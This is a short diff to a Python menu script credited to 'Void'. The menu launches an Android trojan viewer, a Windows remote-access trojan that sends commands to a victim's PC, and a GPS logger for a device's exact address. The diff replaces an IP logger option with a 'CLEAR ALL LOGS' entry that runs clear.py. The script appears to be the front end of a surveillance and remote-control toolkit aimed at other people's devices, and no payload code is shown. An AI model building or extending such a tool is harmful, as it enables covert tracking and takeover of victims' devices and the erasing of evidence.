@@ -17,7 +17,7 @@ Coded by: Void
 1: ATV (Android Trojan Viewer.)
 2: WKLV (Windows RAT, Send commands to windows PC/LAPTOP.)
 3: GPS Logger. (Get the exact address of the device.)
-4: IP Logger.
+4: CLEAR ALL LOGS.
 ---------------------------------------------------
 """
 def main():
@@ -34,7 +34,7 @@ def main():
     elif choice == "3":
         subprocess.run(["python3", "gps.py"])
     elif choice == "4":
-        print(RED + "Changing this due to gps logger also logging the public ip too." + RESET)
+        subprocess.run(["python3", "clear.py"])
     else:
         print(RED + "Invalid choice." + RESET)
 
